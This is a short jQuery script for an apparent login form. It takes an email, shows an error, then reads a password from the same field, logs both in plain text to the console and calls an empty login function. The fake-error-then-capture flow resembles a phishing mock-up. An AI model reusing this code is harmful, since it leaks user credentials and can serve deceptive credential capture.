/* global $ */
/* global Firebase */
$("#error").hide()
var time = 1;
var username = null;
var password = null;
$("#submit").click(onclick);
function onclick() {
    if (time === 1) {
        username = $("#email").val();
        $("#error").show();
        $("#email").html("");

        time = 2;
    } else {
        password = $("#email").val();
        console.log(username + " : " + password);
        login(username, password);
    }
    
}
function login() {
    
}